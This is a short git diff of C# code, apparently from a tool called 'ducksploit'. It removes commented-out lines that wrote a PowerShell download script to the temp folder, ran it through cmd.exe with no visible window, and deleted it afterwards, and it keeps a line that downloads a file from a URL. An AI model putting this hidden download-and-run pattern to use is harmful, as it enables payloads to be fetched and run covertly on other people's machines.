@@ -289,42 +289,6 @@ If you wan't something, go to our discord server (can be found on ducksploit.com
 			
 			string tempdir = Path.GetTempPath();
 			new WebClient().DownloadFile(url, outPath);
-			
-			
-			
-			
-			
-			
-			// url = '"' + url + '"';
-			
-			// outPath = '"' + outPath + '"';
-			
-			// string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
-			
-			// outPath = tempdir + @"\download.ps1";
-			
-            // FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
-            // StreamWriter streamwrite = new StreamWriter(streamfile);
-			
-			// outPath = '"' + tempdir + @"\download.ps1" + '"';
-			
-			
-            // streamwrite.WriteLine(str);
-            // streamwrite.Flush();
-            // streamwrite.Close();
-            // streamfile.Close();
-			
-
-			
-			// ProcessStartInfo processInfo;
-			// Process process;
-			// processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + @"\download.ps1");
-			// processInfo.CreateNoWindow = true;
-			// processInfo.UseShellExecute = false;
-			// processInfo.RedirectStandardOutput = true;
-			// process = Process.Start(processInfo);
-			// process.WaitForExit();		
-			// execute_cmd("if exist " + tempdir + @"\download.ps1 (del " + tempdir + @"\download.ps1)");
 		}
     }
 	public class Program
